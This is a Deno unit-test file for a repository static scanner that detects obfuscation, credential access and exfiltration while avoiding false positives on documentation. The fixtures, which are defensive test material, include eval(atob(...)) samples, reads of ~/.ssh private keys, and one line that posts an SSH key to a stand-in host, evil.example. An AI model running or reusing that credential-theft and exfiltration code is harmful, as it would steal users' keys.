/**
 * Unit tests for the static-scan heuristics. Two precision properties are guarded:
 *
 *  1. OBFUSCATION precision: legitimate dynamic-code (`new Function('…')`) must NOT
 *     trip the binary `obfuscation` signal (which auto-escalates and weighs -42),
 *     while real obfuscation (eval-of-decoded, long base64 blobs) still must.
 *
 *  2. DOC-vs-CODE precision (credential-access false-positive fix): a README/doc
 *     that merely MENTIONS a credential path, secret format, or network literal in
 *     prose must NOT set the binary code signals (credAccess -40, embeddedSecret,
 *     network), while actual source code performing those accesses still MUST.
 *
 * Run: `deno test supabase/functions/_shared/static-scan.test.ts`
 */

import { assert, assertEquals } from "jsr:@std/assert@1";
import { staticScan } from "./static-scan.ts";
import type { FetchedFile } from "./github.ts";

function file(path: string, content: string): FetchedFile {
  return { path, content, truncated: false };
}

Deno.test("legit `new Function('literal')` is NOT obfuscation, but is flagged as a region", () => {
  // Arrange — morgan-style format compiler: legitimate metaprogramming.
  const morganLike = file(
    "index.js",
    [
      "function compile(format) {",
      "  const js = '  return \"' + format.replace(/:(\\w+)/g, '\" + (tokens.$1(req,res)) + \"') + '\"';",
      "  return new Function('tokens, req, res', js);",
      "}",
      "module.exports = compile;",
    ].join("\n"),
  );

  // Act
  const result = staticScan([morganLike]);

  // Assert — no binary obfuscation signal (so no auto-escalation / -42)…
  assertEquals(result.signals.obfuscation, false, "new Function must not set the obfuscation signal");
  assertEquals(result.severityHint, "clean", "a legit metaprogramming repo stays clean");
  // …but the region IS surfaced for the read model to judge in context.
  assert(
    result.flaggedRegions.some((r) => /dynamic Function constructor/.test(r.reason)),
    "new Function should still be flagged as a region for the model",
  );
});

Deno.test("real obfuscation (eval of decoded payload) DOES set the obfuscation signal", () => {
  // Arrange
  const evil = file(
    "payload.js",
    "const x = eval(atob('Y29uc29sZS5sb2coMSk='));",
  );

  // Act
  const result = staticScan([evil]);

  // Assert
  assertEquals(result.signals.obfuscation, true, "eval(atob(...)) must set obfuscation");
  assertEquals(result.severityHint, "high");
});

Deno.test("Function() of a long base64 blob still trips obfuscation", () => {
  // Arrange — 120+ base64 chars handed to the Function constructor.
  const blob = "A".repeat(160);
  const evil = file("bundle.js", `const f = new Function("${blob}");`);

  // Act
  const result = staticScan([evil]);

  // Assert
  assertEquals(result.signals.obfuscation, true, "Function('<long base64>') must set obfuscation");
});

Deno.test("a fully clean source file trips no code signals", () => {
  // Arrange
  const clean = file(
    "math.js",
    "export function add(a, b) { return a + b; }\nexport const PI = 3.14159;",
  );

  // Act
  const result = staticScan([clean]);

  // Assert
  assertEquals(result.signals.obfuscation, false);
  assertEquals(result.signals.credAccess, false);
  assertEquals(result.signals.network, false);
  assertEquals(result.signals.embeddedSecret, false);
  assertEquals(result.severityHint, "clean");
});

Deno.test("credential-path access is still detected (regression guard)", () => {
  // Arrange
  const stealer = file("index.js", "const k = fs.readFileSync(process.env.HOME + '/.ssh/id_ed25519');");

  // Act
  const result = staticScan([stealer]);

  // Assert
  assertEquals(result.signals.credAccess, true, "SSH key path access must still flag");
  assertEquals(result.severityHint, "high");
});

Deno.test("new Function of a 60+ char encoded LITERAL trips obfuscation (H1 regression fix)", () => {
  // Arrange — an 80-char base64 literal handed to new Function (sub-120, the gap
  // the prior threshold left open). Pure base64 charset, no spaces.
  const blob = "QWxhZGRpbjpvcGVuc2VzYW1lQWxhZGRpbjpvcGVuc2VzYW1lQWxhZGRpbjpvcGVuc2VzYW1l"; // 72 chars
  const evil = file("p.js", `const f = new Function('${blob}'); f();`);

  // Act
  const result = staticScan([evil]);

  // Assert — now a HARD signal again (was only a soft region before the fix).
  assertEquals(result.signals.obfuscation, true, "60+ char encoded literal in new Function must trip obfuscation");
  assertEquals(result.severityHint, "high");
});

Deno.test("new Function(atob(...)) — decoded payload into Function — trips obfuscation (H2 hard)", () => {
  // Arrange
  const evil = file("p.js", "const f = new Function(atob('cmV0dXJuIDE=')); f();");

  // Act
  const result = staticScan([evil]);

  // Assert
  assertEquals(result.signals.obfuscation, true, "Function(atob(...)) must trip obfuscation");
});

Deno.test("new Function(variable) is flagged as a REGION (no false signal) — H2 soft", () => {
  // Arrange — a computed argument (payload could be decoded into the var at run
  // time). Region-only so the model sees it; NOT a hard signal on its own.
  const code = file("p.js", "const payload = decode(x);\nconst f = new Function(payload);");

  // Act
  const result = staticScan([code]);

  // Assert
  assertEquals(result.signals.obfuscation, false, "a bare computed-arg new Function is not itself obfuscation");
  assert(
    result.flaggedRegions.some((r) => /computed argument/.test(r.reason)),
    "new Function(variable) must still be surfaced as a region for the model",
  );
});

// --- Doc-vs-code distinction (credential-access false-positive fix) ----------
// A README/doc that merely MENTIONS a credential path in prose must NOT trip the
// binary credAccess signal (which weighs -40 and would false-flag a repo as
// "Dangerous"), while actual code that reads a credential path still MUST. This
// is the exact google-labs-code/design.md failure: a README describing ".npmrc
// registry configuration" scored 51/100 "High risk" purely on a -40 credAccess.

Deno.test("README merely MENTIONING .npmrc in prose does NOT set credAccess (design.md repro)", () => {
  // Arrange — the exact shape of the live false positive: a documentation file
  // describing .npmrc registry configuration in prose, no executable access.
  const readme = file(
    "README.md",
    [
      "# design.md",
      "",
      "A design specification project under the Google Labs organization.",
      "",
      "## Registry configuration",
      "",
      "For corporate development environments, configure your `.npmrc` to point",
      "at the internal registry. This project never reads your `~/.ssh` keys or",
      "your `.aws/credentials`; those are mentioned here only for documentation.",
    ].join("\n"),
  );

  // Act
  const result = staticScan([readme]);

  // Assert — the binary signal must NOT fire on a prose mention…
  assertEquals(
    result.signals.credAccess,
    false,
    "a README mentioning .npmrc/.ssh/.aws in prose must NOT set credAccess (no -40 penalty)",
  );
  // …and with no other code signal, the repo stays clean, not "high".
  assertEquals(
    result.severityHint,
    "clean",
    "a docs-only repo mentioning credential paths in prose must not be scored high-severity",
  );
  // …but the mention IS still surfaced as a region so the read model sees it and
  // the report can honestly cite it (never-bare-Safe: we say what we saw).
  assert(
    result.flaggedRegions.some(
      (r) => /mentioned in documentation\/prose/.test(r.reason) && /npmrc/.test(r.reason),
    ),
    "the prose .npmrc mention must still be surfaced as a documentation region for the model",
  );
});

Deno.test("real CODE reading a credential path STILL sets credAccess at full severity (no regression)", () => {
  // Arrange — genuine credential theft: source code that reads ~/.ssh at runtime.
  const stealer = file(
    "src/exfil.js",
    "const fs = require('fs');\n" +
      "const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');\n" +
      "fetch('https://evil.example/collect', { method: 'POST', body: key });",
  );

  // Act
  const result = staticScan([stealer]);

  // Assert — the signal MUST still fire at full severity for real code.
  assertEquals(
    result.signals.credAccess,
    true,
    "code that reads ~/.ssh/id_rsa MUST still set credAccess (the -40 penalty must not be weakened)",
  );
  assertEquals(result.severityHint, "high", "real credential-reading code stays high-severity");
});

Deno.test("credential path in a docs/ directory file (any extension) is prose, not access", () => {
  // Arrange — docs live under docs/ regardless of extension; a config example
  // there is documentation, not executable code.
  const doc = file(
    "docs/setup-guide.txt",
    "Place your npm auth token in ~/.npmrc and your cloud creds in .aws/credentials.",
  );

  // Act
  const result = staticScan([doc]);

  // Assert
  assertEquals(result.signals.credAccess, false, "a docs/ guide mentioning credential paths is prose, not access");
  assertEquals(result.severityHint, "clean");
});

Deno.test("a doc mention alongside real code: code still trips the signal", () => {
  // Arrange — a repo with BOTH a benign README mention AND a real credential read
  // in source. The signal must fire (driven by the code), proving the doc file
  // does not mask a genuine access elsewhere in the same repo.
  const readme = file("README.md", "Configure `.npmrc` for the internal registry.");
  const code = file("index.js", "const k = fs.readFileSync(process.env.HOME + '/.ssh/id_ed25519');");

  // Act
  const result = staticScan([readme, code]);

  // Assert
  assertEquals(result.signals.credAccess, true, "real code access must still set credAccess even beside a benign doc mention");
  assertEquals(result.severityHint, "high");
});

Deno.test("embedded-secret / network literals in docs are prose too (systemic doc-vs-code fix)", () => {
  // Arrange — a README documenting an example AWS key format and an example IP.
  // These are documentation, not a committed live secret or a real network call.
  const readme = file(
    "README.md",
    [
      "Example access key id format: AKIAIOSFODNN7EXAMPLE",
      "During local dev the service listens on http://127.0.0.1:8080",
    ].join("\n"),
  );

  // Act
  const result = staticScan([readme]);

  // Assert — no binary code signals fire on prose examples…
  assertEquals(result.signals.embeddedSecret, false, "an example key format in a README is not an embedded secret");
  assertEquals(result.signals.network, false, "an example IP:port in a README is not a network capability");
  assertEquals(result.severityHint, "clean");
  // …but they are still surfaced as documentation regions for the model.
  assert(
    result.flaggedRegions.some((r) => /mentioned in documentation\/prose/.test(r.reason)),
    "doc-side matches must still be surfaced as regions for the model",
  );
});
